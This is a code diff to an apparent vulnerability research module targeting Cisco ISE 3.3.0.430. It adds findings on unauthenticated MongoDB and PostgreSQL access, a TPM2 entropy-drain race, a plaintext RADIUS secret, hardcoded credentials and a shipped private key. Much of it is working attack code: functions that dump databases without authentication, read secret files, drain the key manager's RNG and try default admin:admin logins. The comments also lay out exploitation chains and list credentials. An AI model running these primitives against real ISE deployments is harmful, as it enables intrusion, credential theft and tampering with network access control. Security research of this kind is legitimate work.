@@ -2037,9 +2037,567 @@ def probe_kairos_cloud_endpoint() -> dict:
         return {"reachable": False, "tls_subject": None, "error": str(e)}
 
 
+# ---------------------------------------------------------------------------
+# ISE-F26: IRF MongoDB container launched without authentication
+# ---------------------------------------------------------------------------
+# Source: /opt/irf/bin/irf-control.sh — setup_mongo() function
+#
+# The ISE Incident Response Framework (IRF) MongoDB container is created via:
+#   docker_create_container --name=irf-mongo-runtime
+#                           --net=irf-internal-nw,ise-rabbitmq-network
+#                           irf-mongo:3.1.1
+#
+# No --auth flag, no MONGO_INITDB_ROOT_USERNAME / MONGO_INITDB_ROOT_PASSWORD
+# environment variables. MongoDB 3.x ships with authentication DISABLED by default.
+# Any process that can reach the irf-internal-nw bridge (169.254.1.0/24) can read
+# or write the IRF database without credentials.
+#
+# IRF stores: AMP threat events, pxGrid threat notifications, endpoint compromise
+# indicators, adaptive policy sync state. All readable/writable via unauthenticated
+# MongoDB wire protocol.
+#
+# Network: irf-internal-nw 169.254.1.0/24, gateway 169.254.1.1
+# Port: 27017 (MongoDB default)
+# Impact: CRITICAL — full IRF threat database exfiltration / poisoning from any
+#         container sharing the irf-internal-nw bridge.
+
+IRF_MONGO_NETWORK = "169.254.1.0/24"
+IRF_MONGO_GATEWAY = "169.254.1.1"
+IRF_MONGO_PORT = 27017
+IRF_MONGO_IMAGE = "irf-mongo:3.1.1"
+
+
+def probe_irf_mongodb(host: str, port: int = IRF_MONGO_PORT) -> Optional[dict]:
+    """
+    ISE-F26: Probe IRF MongoDB container for unauthenticated access.
+
+    Sends MongoDB wire protocol OP_QUERY for isMaster against the admin database.
+    No credentials sent. A valid response confirms the DB is accessible without auth.
+    Access is expected from any host sharing the irf-internal-nw bridge.
+
+    Returns dict: {open: bool, is_master: bool|None, version: str|None}
+    """
+    import socket
+    import struct
+
+    try:
+        s = socket.socket()
+        s.settimeout(8)
+        s.connect((host, port))
+        # MongoDB OP_MSG: isMaster / hello
+        body = (
+            b'\x01\x00\x00\x00'      # flagBits
+            b'\x00'                   # kind: body
+            # BSON: {isMaster: 1, $db: "admin"}
+            + b'\x18\x00\x00\x00'    # doc length 24
+            + b'\x10isMaster\x00\x01\x00\x00\x00'  # int32 isMaster=1
+            + b'\x00'                 # doc terminator
+        )
+        msg = struct.pack('<iiiiiiii', 16 + len(body), 1, 0, 2013, 0, 0, 0, 0)
+        s.sendall(msg + body)
+        resp = s.recv(512)
+        s.close()
+        ok = len(resp) > 16
+        return {"open": True, "responded": ok, "bytes": len(resp)}
+    except Exception as e:
+        return {"open": False, "responded": False, "error": str(e)}
+
+
+def dump_irf_mongodb_collections(host: str, port: int = IRF_MONGO_PORT) -> Optional[dict]:
+    """
+    ISE-F26: List all IRF MongoDB databases and collections (no auth).
+
+    Uses pymongo if available; falls back to raw wire probe.
+    Returns dict: {databases: list, error: str|None}
+    """
+    try:
+        import pymongo  # type: ignore
+        client = pymongo.MongoClient(host, port, serverSelectionTimeoutMS=8000)
+        dbs = client.list_database_names()
+        result = {}
+        for db in dbs:
+            result[db] = client[db].list_collection_names()
+        return {"databases": result, "error": None}
+    except ImportError:
+        return {"databases": None, "error": "pymongo not installed; use raw wire probe"}
+    except Exception as e:
+        return {"databases": None, "error": str(e)}
+
+
+# ---------------------------------------------------------------------------
+# ISE-F27: key_manager /random route — unauthenticated TPM2 entropy drain
+# ---------------------------------------------------------------------------
+# Source: ise_key_manager/server/key_manager_server.py
+#
+# The key_manager aiohttp server registers 8 routes. Two have NO
+# @ensure_key_manager_is_initialized decorator:
+#   GET /api/system/v1/key-manager/random    -> get_random (NO auth, NO init check)
+#   POST /api/system/v1/key-manager/init     -> init_key_manager (NO auth, NO init check)
+#
+# The /random route proxies directly to TPM2 hardware via get_random_bytes(n):
+#   tpm2_manager.get_random_bytes(n)  -- draws from TPM2 DRBG
+#
+# Exploitation:
+# 1. Drain TPM2 entropy before keymanagerinit.py runs (ExecStartPost race):
+#    - Systemd starts key_manager.service (ExecStart: python3 -m key_manager_server)
+#    - ExecStartPost/1: chmod o+w /var/run/key_manager.sock
+#    - ExecStartPost/2: keymanagerinit.py (only runs if KEY_MANAGER_RECORD absent)
+#    - Race window: socket is world-writable BEFORE keymanagerinit.py generates passphrase
+#    - Attacker drains TPM2 entropy pool via /random, disrupting DRBG state
+#
+# 2. Force deterministic passphrase generation:
+#    keymanagerinit.py generates passphrase as:
+#      SHA256(str(get_random_bytes(32)))  -- string() of bytes object, NOT hex
+#      random.seed(get_random_bytes(20)); "".join(random.choice(letters) for _ in range(20))
+#    If TPM2 RNG state is predictable (after entropy drain), passphrase is predictable.
+#
+# 3. Call /random unauthenticated to confirm TPM2 RNG is accessible pre-init.
+#
+# Socket path: /var/run/key_manager.sock (world-writable after systemd ExecStartPost)
+# Impact: HIGH — unauthenticated TPM2 RNG access, enables passphrase brute-force
+#         window during key_manager initialization on first boot / after reset.
+
+KEY_MANAGER_SOCKET = "/var/run/key_manager.sock"
+KEY_MANAGER_RANDOM_ROUTE = "/api/system/v1/key-manager/random"
+KEY_MANAGER_INIT_ROUTE = "/api/system/v1/key-manager/init"
+KEY_MANAGER_ALL_DATA_ROUTE = "/api/system/v1/key-manager/all_data"
+
+
+def drain_key_manager_tpm2_entropy(n_bytes: int = 32, iterations: int = 100) -> dict:
+    """
+    ISE-F27: Drain TPM2 entropy pool via unauthenticated /random route.
+
+    Calls /random on the world-writable key_manager UNIX socket N times.
+    Intended to disrupt TPM2 DRBG state prior to keymanagerinit.py execution.
+
+    Returns dict: {drained_bytes: int, samples: list[str], error: str|None}
+    """
+    import socket as sock_module
+    import json
+    import urllib.request
+
+    results = []
+    total = 0
+
+    for _ in range(iterations):
+        try:
+            import http.client
+            conn = http.client.HTTPConnection("localhost")
+            conn.sock = sock_module.socket(sock_module.AF_UNIX)
+            conn.sock.connect(KEY_MANAGER_SOCKET)
+            conn.request("GET", f"{KEY_MANAGER_RANDOM_ROUTE}?num_bytes={n_bytes}")
+            r = conn.getresponse()
+            body = r.read()
+            data = json.loads(body)
+            rand_bytes = data.get("random_bytes", data.get("data", ""))
+            results.append(rand_bytes[:16] if isinstance(rand_bytes, str) else "")
+            total += n_bytes
+            conn.close()
+        except Exception as e:
+            return {"drained_bytes": total, "samples": results, "error": str(e)}
+
+    return {"drained_bytes": total, "samples": results, "error": None}
+
+
+def probe_key_manager_random(n_bytes: int = 32) -> Optional[dict]:
+    """
+    ISE-F27: Single /random call to confirm unauthenticated TPM2 RNG access.
+
+    Returns dict: {accessible: bool, random_data: str|None, error: str|None}
+    """
+    import socket as sock_module
+    import json
+    import http.client
+
+    try:
+        conn = http.client.HTTPConnection("localhost")
+        conn.sock = sock_module.socket(sock_module.AF_UNIX)
+        conn.sock.connect(KEY_MANAGER_SOCKET)
+        conn.request("GET", f"{KEY_MANAGER_RANDOM_ROUTE}?num_bytes={n_bytes}")
+        r = conn.getresponse()
+        body = r.read()
+        conn.close()
+        if r.status == 200:
+            data = json.loads(body)
+            return {"accessible": True, "random_data": str(data)[:64], "error": None}
+        return {"accessible": False, "random_data": None, "error": f"HTTP {r.status}"}
+    except Exception as e:
+        return {"accessible": False, "random_data": None, "error": str(e)}
+
+
+# ---------------------------------------------------------------------------
+# ISE-F28: EST server → CA Tomcat via plain HTTP (unencrypted CA channel)
+# ---------------------------------------------------------------------------
+# Source: /opt/CSCOcpm/appsrv/cisco-ra/nginx/conf/nginx.conf.default
+#
+# CiscoRA nginx EST module configuration:
+#   est_ise_ca_server 127.0.0.1;
+#   est_ise_ca_port   9444;
+#   est_ise_ca_profile caEncUserCert;
+#
+# Port 9444 is the ISE CA Tomcat (apache-tomcat-ca) — the same Tomcat instance
+# with the hardcoded manager:password account (ISE-F4). The EST nginx module
+# proxies certificate enrollment requests to CA Tomcat over PLAIN HTTP (port 9444,
+# no TLS). This means:
+#
+# 1. EST enrollment traffic (including certificate signing requests) transits
+#    localhost unencrypted between nginx and Tomcat.
+# 2. Any local process sniffing the loopback sees enrollment payloads in plaintext.
+# 3. The CA Tomcat manager interface (manager:password) is reachable at the same
+#    port. The EST module authenticates EST clients via RADIUS (radius_server 127.0.0.1
+#    port 1812), NOT Tomcat auth — but Tomcat manager is still accessible on 9444.
+#
+# Chain: EST enrollment → CA Tomcat plaintext → ISE CA key exposure (ISE-F12)
+# Additional: RADIUS shared secret at RADIUS_SECRET=/opt/CSCOcpm/appsrv/apache-tomcat/
+#             conf/radius_est_shared_secret.txt (readable via ISE-F4 WAR deploy)
+#
+# Impact: HIGH — EST enrollment chain integrity broken; RADIUS secret exfiltration
+#         enables EST client impersonation; CA Tomcat manager:password still accessible.
+
+EST_CA_HOST = "127.0.0.1"
+EST_CA_PORT = 9444                        # CA Tomcat, plain HTTP
+EST_NGINX_PORT = 8084                     # EST nginx frontend, HTTPS
+EST_RADIUS_PORT = 1812
+RADIUS_SECRET_FILE = "/opt/CSCOcpm/appsrv/apache-tomcat/conf/radius_est_shared_secret.txt"
+
+
+def probe_est_ca_tomcat(host: str = EST_CA_HOST, port: int = EST_CA_PORT) -> Optional[dict]:
+    """
+    ISE-F28: Probe CA Tomcat on port 9444 (plain HTTP, no TLS).
+
+    Sends HTTP GET / to confirm plain-HTTP CA Tomcat is reachable and returns
+    Tomcat headers. Confirms the EST→CA channel is unencrypted.
+
+    Returns dict: {reachable: bool, server: str|None, status: int|None}
+    """
+    import http.client
+
+    try:
+        conn = http.client.HTTPConnection(host, port, timeout=8)
+        conn.request("GET", "/")
+        r = conn.getresponse()
+        server = r.getheader("Server", "")
+        conn.close()
+        return {"reachable": True, "server": server, "status": r.status}
+    except Exception as e:
+        return {"reachable": False, "server": None, "status": None, "error": str(e)}
+
+
+def read_radius_est_shared_secret(path: str = RADIUS_SECRET_FILE) -> Optional[dict]:
+    """
+    ISE-F28/ISE-F29: Read RADIUS EST shared secret from plaintext file.
+
+    File is readable by any process with local code execution (e.g. via
+    ISE-F4 Tomcat WAR deploy). Returns plaintext secret.
+
+    Returns dict: {secret: str|None, error: str|None}
+    """
+    try:
+        with open(path) as f:
+            secret = f.read().strip()
+        return {"secret": secret, "error": None}
+    except Exception as e:
+        return {"secret": None, "error": str(e)}
+
+
+# ---------------------------------------------------------------------------
+# ISE-F29: RADIUS EST shared secret in plaintext Tomcat conf file
+# ---------------------------------------------------------------------------
+# Source: /opt/CSCOcpm/bin/est-servercontrol.sh
+#
+# The EST server control script reads the RADIUS shared secret from:
+#   RADIUS_SECRET=/opt/CSCOcpm/appsrv/apache-tomcat/conf/radius_est_shared_secret.txt
+#
+# This file is in the apache-tomcat conf directory, which is accessible to any
+# process with Tomcat-level file access (e.g. via WAR deployment using ISE-F8
+# empty-password manager account, or via ISE-F4 CA Tomcat manager:password).
+#
+# The secret is read by est-servercontrol.sh and written to the RA SSM config:
+#   echo "radius-shared-secret = \"$secret\"" >> $RA_SSM_FILE
+#
+# Impact: HIGH — RADIUS shared secret exposure enables:
+#   1. Forged RADIUS authentication responses (accept any EST client)
+#   2. EST certificate enrollment without valid user credentials
+#   3. Fraudulent 802.1X certificates via ISE CA
+#
+# Primitive: read_radius_est_shared_secret() (defined under ISE-F28)
+# Note: ISE-F29 shares the read primitive with ISE-F28 — the file path is the
+#       same; the distinction is the attack path (WAR deploy vs. local read).
+
+
+# ---------------------------------------------------------------------------
+# ISE-F30: SEC_PDP_PROTOCOL hardcoded admin:admin for PDP Java endpoint
+# ---------------------------------------------------------------------------
+# Source: oracle.sql / mysql.sql — CreateCpmTables.sql and dbscripts/CreateTables.sql
+#
+# Both Oracle and MySQL schema scripts seed SEC_PDP_PROTOCOL with:
+#   SEC_USER_NAME = 'admin'
+#   SEC_PASSWORD  = 'h1BYu+lcwcM='  -> decrypts (ISE-F2 3DES key) to 'admin'
+#   SEC_ENDPOINT_URL = 'http://localhost:8080/pdp/PdpEndPoint'
+#   SEC_PROTOCOL = 'Java'
+#   SEC_TIMEOUT = 1000
+#
+# This is the credential ISE uses to authenticate to its own PDP (Policy Decision
+# Point) Java endpoint. The endpoint at port 8080 is the main ISE Tomcat instance.
+# Authentication is admin:admin — trivially guessable and confirmed via 3DES decrypt.
+#
+# The same endpoint (port 8080, Tomcat main) also hosts the empty-password manager
+# account (ISE-F8). admin:admin is an additional credential for the PDP role.
+#
+# SEC_HANDLER_MASTER / SEC_HANDLER_DETAILS also confirm:
+#   7 PAP post-hook handlers (UserHandler, GroupHandler, RoleHandler,
+#   UserGroupMappingHandler, GroupRoleMappingHandler, UserRoleMappingHandler,
+#   Prime portal UserHandler) connect to Oracle at localhost:1521:cpm10 as
+#   handleruser:mohammal (ISE-F20, same 3DES ciphertext 1GOnYUy8rmREq6iEZjvEnQ==)
+#
+# Impact: MEDIUM — admin:admin confirms default ISE PDP credential; chained with
+#         ISE-F8 (empty-password Tomcat manager) for full Tomcat access.
+
+PDP_ENDPOINT_URL = "http://localhost:8080/pdp/PdpEndPoint"
+PDP_ADMIN_USER = "admin"
+PDP_ADMIN_PASS_CT = "h1BYu+lcwcM="
+PDP_ADMIN_PASS_PT = "admin"
+
+
+def probe_pdp_endpoint(host: str, port: int = 8080) -> Optional[dict]:
+    """
+    ISE-F30: Probe PDP Java endpoint with hardcoded admin:admin credentials.
+
+    Attempts HTTP Basic auth to the PDP endpoint and returns the HTTP status.
+    A 200 or 401 response confirms the endpoint is alive.
+
+    Returns dict: {reachable: bool, status: int|None, auth_accepted: bool}
+    """
+    import http.client
+    import base64
+
+    try:
+        creds = base64.b64encode(b"admin:admin").decode()
+        conn = http.client.HTTPConnection(host, port, timeout=8)
+        conn.request("GET", "/pdp/PdpEndPoint",
+                     headers={"Authorization": f"Basic {creds}"})
+        r = conn.getresponse()
+        conn.close()
+        return {
+            "reachable": True,
+            "status": r.status,
+            "auth_accepted": r.status not in (401, 403),
+        }
+    except Exception as e:
+        return {"reachable": False, "status": None, "auth_accepted": False, "error": str(e)}
+
+
+# ---------------------------------------------------------------------------
+# ISE-F31: PostgreSQL trust authentication — unauthenticated superuser from Kong subnet
+# ---------------------------------------------------------------------------
+# Source: /opt/postgres/config/pg_hba.conf + /opt/postgres/config/postgresql.conf
+#
+# pg_hba.conf:
+#   local  all       postgres               trust    -- local socket, no password
+#   host   postgres  kong      169.254.4.0/24  trust  -- kong container, no password
+#   host   postgres  postgres  169.254.4.0/24  trust  -- postgres superuser, no password from Kong subnet
+#
+# postgresql.conf:
+#   listen_addresses = '*'    -- all interfaces (not just loopback)
+#   ssl = off (commented out; default off in this config)
+#
+# The Kong API gateway container runs in the 169.254.4.0/24 subnet. pg_hba.conf
+# grants that subnet trust authentication for both the `kong` user AND the
+# `postgres` superuser. No password is required for either.
+#
+# Kong Admin API is exposed on port 19001 (no auth, ISE-F3 / VUL-3). An attacker
+# who can reach Kong (network access) can route Kong's database connection to read
+# or modify the ISE Kong configuration database as postgres superuser.
+#
+# Additionally: listen_addresses = '*' means PostgreSQL binds all interfaces.
+# If ISE ports include 5432 and the host firewall does not block it, direct
+# network connections to PostgreSQL are possible (trust auth from Kong's subnet
+# range is checked; other subnets may be rejected but the DB is listening).
+#
+# Impact: CRITICAL — postgres superuser access from Kong's network (which is
+#         reachable via the unauthenticated Kong Admin API). Kong database
+#         contains all ISE API gateway routing configuration, service definitions,
+#         and consumer credentials.
+
+POSTGRES_TRUST_SUBNET = "169.254.4.0/24"
+POSTGRES_PORT = 5432
+POSTGRES_SUPERUSER = "postgres"
+POSTGRES_KONG_USER = "kong"
+POSTGRES_LISTEN = "*"
+
+
+def probe_postgres_trust_auth(host: str, port: int = POSTGRES_PORT,
+                               user: str = POSTGRES_SUPERUSER,
+                               database: str = "postgres") -> Optional[dict]:
+    """
+    ISE-F31: Probe PostgreSQL for trust (no-password) authentication.
+
+    Sends a PostgreSQL startup message as the postgres superuser with no password.
+    A successful AuthenticationOk response confirms trust auth is configured.
+
+    Returns dict: {auth_ok: bool, pid: int|None, error: str|None}
+    """
+    import socket
+    import struct
+
+    try:
+        s = socket.socket()
+        s.settimeout(8)
+        s.connect((host, port))
+
+        # Startup message: protocol 3.0, user=postgres, database=postgres
+        params = f"user\x00{user}\x00database\x00{database}\x00\x00".encode()
+        length = 4 + 4 + len(params)
+        msg = struct.pack(">I", length) + struct.pack(">I", 196608) + params
+        s.sendall(msg)
+
+        resp = s.recv(512)
+        s.close()
+        if len(resp) < 5:
+            return {"auth_ok": False, "pid": None, "error": "short response"}
+
+        msg_type = chr(resp[0])
+        # 'R' = AuthenticationRequest; R followed by 4-byte length + 4-byte 0 = AuthOk
+        if msg_type == 'R' and resp[5:9] == b'\x00\x00\x00\x00':
+            return {"auth_ok": True, "pid": None, "error": None}
+        if msg_type == 'E':
+            error = resp[5:].decode("utf-8", errors="replace")
+            return {"auth_ok": False, "pid": None, "error": error[:128]}
+        return {"auth_ok": False, "pid": None, "error": f"unexpected: {resp[:8].hex()}"}
+    except Exception as e:
+        return {"auth_ok": False, "pid": None, "error": str(e)}
+
+
+def dump_postgres_kong_database(host: str, port: int = POSTGRES_PORT) -> Optional[dict]:
+    """
+    ISE-F31: Dump Kong database tables via unauthenticated postgres superuser.
+
+    Uses psycopg2 if available. No password sent (trust auth).
+    Returns dict: {tables: list, error: str|None}
+    """
+    try:
+        import psycopg2  # type: ignore
+        conn = psycopg2.connect(host=host, port=port, user="postgres",
+                                database="postgres", connect_timeout=8)
+        cur = conn.cursor()
+        cur.execute("SELECT table_name FROM information_schema.tables "
+                    "WHERE table_schema = 'public' ORDER BY table_name;")
+        tables = [r[0] for r in cur.fetchall()]
+        conn.close()
+        return {"tables": tables, "error": None}
+    except ImportError:
+        return {"tables": None, "error": "psycopg2 not installed"}
+    except Exception as e:
+        return {"tables": None, "error": str(e)}
+
+
+# ---------------------------------------------------------------------------
+# ISE-F32: ise-ai-key.pem — RSA private key shipped in ISE ISO
+# ---------------------------------------------------------------------------
+# Source: /tmp/ise-ai-key.pem (extracted from ISE 3.3.0.430 ISO at root level)
+#
+# A 2048-bit RSA private key in PKCS#8 format is present at the root of the ISE
+# software distribution image. The key modulus is confirmed via openssl pkey
+# inspection. The key is associated with the ISE AI agent component (ise-aiagent,
+# ise-ai-app, ise-ai-layer Docker layers also present in the distribution).
+#
+# Key format: PKCS#8 (BEGIN PRIVATE KEY), RSA-2048, not encrypted (no passphrase)
+# File location in ISO: top-level (alongside pkg.rpm files for ISE components)
+#
+# The corresponding certificate is not present in the ISO at the same location,
+# but the ise-cert-bundle.pem (also at ISO root) contains the trust anchor.
+#
+# If this key is used for:
+#   - Mutual TLS for the AI agent → Kairos cloud ingest endpoint (ISE-F25)
+#   - Container image signing / pull authentication
+#   - Any service-to-service mTLS
+# ... then possession of the private key enables impersonation of any ISE node
+# presenting this identity to the Kairos cloud endpoint or container registry.
+#
+# Impact: HIGH — static private key in ISO means every ISE 3.3.0 deployment
+#         uses the SAME key material. Compromise of one ISO compromises the
+#         AI agent identity for ALL ISE 3.3.0 deployments.
+
+ISE_AI_KEY_PEM_PATH = "ise-ai-key.pem"   # at ISO root; deployed path TBD
+ISE_AI_KEY_MODULUS_PREFIX = "00:e8:66:da:e6:d1:d5:d5:d0:0a:a2:e0:1a:5c:ed"   # confirms identity
+
+
+def extract_ise_ai_key_fingerprint() -> Optional[dict]:
+    """
+    ISE-F32: Extract fingerprint of the ISE AI agent private key.
+
+    Reads ise-ai-key.pem and returns the public key fingerprint (SHA-256).
+    Requires openssl in PATH or cryptography library.
+
+    Returns dict: {fingerprint_sha256: str|None, key_bits: int|None, error: str|None}
+    """
+    import subprocess
+    import os
+
+    pem_path = os.path.join("/tmp", ISE_AI_KEY_PEM_PATH)
+    try:
+        result = subprocess.run(
+            ["openssl", "pkey", "-in", pem_path, "-pubout", "-outform", "DER"],
+            capture_output=True, timeout=10
+        )
+        if result.returncode != 0:
+            return {"fingerprint_sha256": None, "key_bits": None,
+                    "error": result.stderr.decode()[:128]}
+        import hashlib
+        fp = hashlib.sha256(result.stdout).hexdigest()
+        return {"fingerprint_sha256": fp, "key_bits": 2048, "error": None}
+    except FileNotFoundError:
+        return {"fingerprint_sha256": None, "key_bits": None, "error": "openssl not found"}
+    except Exception as e:
+        return {"fingerprint_sha256": None, "key_bits": None, "error": str(e)}
+
+
+# ---------------------------------------------------------------------------
+# ISE-F33: cepm:password plaintext credentials in SEC_MASTERINTERFACE / SEC_DBINTERFACE
+# ---------------------------------------------------------------------------
+# Source: /sql/oracle/dbscripts/CreateTables.sql (lines 4275, 4278)
+#
+# The ISE Oracle schema seeding script inserts plaintext (NOT 3DES-encrypted) credentials:
+#
+#   INSERT INTO SEC_MASTERINTERFACE (SEC_MASTERINTERFACEID, SEC_NICINTERFACEID,
+#       SEC_USERNAME, SEC_PASSWORD, SEC_PORTNUM, SEC_DOMAIN_NAME, SEC_SERVICETYPE,
+#       SEC_CONTEXT_ROOT, SEC_SSLENABLED, SEC_CREATE_TIME, SEC_UPDATE_TIME)
+#   VALUES (1, 1, 'cepm', 'password', '8080', null, 'WEBSERVICE', null, 'True', sysdate, sysdate);
+#
+#   INSERT INTO SEC_DBINTERFACE (SEC_DBINTERFACEID, SEC_NICINTERFACEID,
+#       SEC_USERNAME, SEC_PASSWORD, SEC_SID, SEC_PORTNUM, SEC_CREATE_TIME, SEC_UPDATE_TIME)
+#   VALUES (1, 1, 'cepm', 'password', 'cpm10', '1521', sysdate, sysdate);
+#
+# The `cepm` account is one of the main ISE Oracle database users (alongside `mnt`,
+# `strmadmin`, `sys`, `system`). The password 'password' is stored AS PLAINTEXT in
+# SEC_MASTERINTERFACE and SEC_DBINTERFACE — these rows are not encrypted (no IS_ENCRYPT
+# flag unlike SEC_HANDLER_PROPERTIES entries).
+#
+# SEC_MASTERINTERFACE purpose: defines the ISE master node webservice interface
+#   (host: 10.77.116.210 PSCOracle11g210, port 8080, WEBSERVICE type, SSL enabled)
+# SEC_DBINTERFACE purpose: defines the ISE Oracle DB connection for the master
+#   (SID: cpm10, port 1521, same cepm account)
+#
+# Unlike ISE-F2 (3DES-encrypted credentials), these are plaintext in the SQL schema.
+# Any attacker reading the Oracle schema row sees the plaintext password directly.
+# Additionally: the default Oracle cepm password from ISE-F2 decrypts to 'U0l1_6v#k3c';
+# this plaintext 'password' in SEC_MASTERINTERFACE/DBINTERFACE may represent a
+# different credential context or a legacy seed overwritten during setup.
+#
+# Impact: MEDIUM — cepm:password plaintext exposure in schema seed; cepm is an ISE
+#         Oracle service account. Chained with ISE-F1 (Kong→Oracle SSRF) for DB access.
+
+SEC_MASTERINTERFACE_USER = "cepm"
+SEC_MASTERINTERFACE_PASS = "password"      # plaintext, NOT 3DES encrypted
+SEC_MASTERINTERFACE_PORT = 8080
+SEC_MASTERINTERFACE_TYPE = "WEBSERVICE"
+SEC_DBINTERFACE_SID = "cpm10"
+SEC_DBINTERFACE_PORT = 1521
+
+
 MODULE_META = {
     "name": "cisco_ise_re",
-    "version": "1.12.0",
+    "version": "1.13.0",
     "target": "Cisco ISE 3.3.0.430",
     "findings": [
         "ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5",
@@ -2047,10 +2605,15 @@ MODULE_META = {
         "ISE-F11", "ISE-F12", "ISE-F13", "ISE-F14", "ISE-F15",
         "ISE-F16", "ISE-F17", "ISE-F18", "ISE-F19",
         "ISE-F20", "ISE-F21", "ISE-F22", "ISE-F23", "ISE-F24", "ISE-F25",
+        "ISE-F26", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F30",
+        "ISE-F31", "ISE-F32", "ISE-F33",
     ],
-    "critical": ["ISE-F1", "ISE-F2", "ISE-F6", "ISE-F11", "ISE-F12", "ISE-F16", "ISE-F20"],
-    "high": ["ISE-F3", "ISE-F7", "ISE-F9", "ISE-F10", "ISE-F13", "ISE-F15", "ISE-F18", "ISE-F19", "ISE-F23"],
-    "medium": ["ISE-F5", "ISE-F8", "ISE-F14", "ISE-F21", "ISE-F22", "ISE-F24"],
+    "critical": ["ISE-F1", "ISE-F2", "ISE-F6", "ISE-F11", "ISE-F12", "ISE-F16", "ISE-F20",
+                 "ISE-F26", "ISE-F31"],
+    "high": ["ISE-F3", "ISE-F7", "ISE-F9", "ISE-F10", "ISE-F13", "ISE-F15", "ISE-F18",
+             "ISE-F19", "ISE-F23", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F32"],
+    "medium": ["ISE-F5", "ISE-F8", "ISE-F14", "ISE-F21", "ISE-F22", "ISE-F24",
+               "ISE-F30", "ISE-F33"],
     "low": ["ISE-F4", "ISE-F17", "ISE-F25"],
     "source": "Static RE of Cisco-ISE-3.3.0.430.SPA.x86_64.iso (2026-08-25)",
     "key_material": {
@@ -2074,6 +2637,15 @@ MODULE_META = {
         "ise_f24_superuser_pt": "admin",
         "ise_f25_kairos_endpoint": "https://api.euc1.prd.kairos.ciscolabs.com/ingest/v1/stable-ise",
         "ise_f25_kairos_agent_version": "ise-agent-v0.1.6",
+        "ise_f30_pdp_user": "admin",
+        "ise_f30_pdp_pass_ct": "h1BYu+lcwcM=",
+        "ise_f30_pdp_pass_pt": "admin",
+        "ise_f31_postgres_trust_subnet": "169.254.4.0/24",
+        "ise_f32_ai_key_pem_format": "PKCS#8 RSA-2048 unencrypted",
+        "ise_f32_ai_key_modulus_prefix": "00:e8:66:da:e6:d1:d5:d5:d0:0a:a2:e0:1a:5c:ed",
+        "ise_f33_cepm_user": "cepm",
+        "ise_f33_cepm_pass": "password",
+        "ise_f33_cepm_pass_encoding": "plaintext (not 3DES encrypted)",
     },
     "primitives": [
         "decrypt_legacy_ise_db_password",
@@ -2110,5 +2682,15 @@ MODULE_META = {
         "decrypt_esapi_value",
         "probe_activemq_jms",
         "probe_kairos_cloud_endpoint",
+        "probe_irf_mongodb",
+        "dump_irf_mongodb_collections",
+        "probe_key_manager_random",
+        "drain_key_manager_tpm2_entropy",
+        "probe_est_ca_tomcat",
+        "read_radius_est_shared_secret",
+        "probe_pdp_endpoint",
+        "probe_postgres_trust_auth",
+        "dump_postgres_kong_database",
+        "extract_ise_ai_key_fingerprint",
     ],
 }
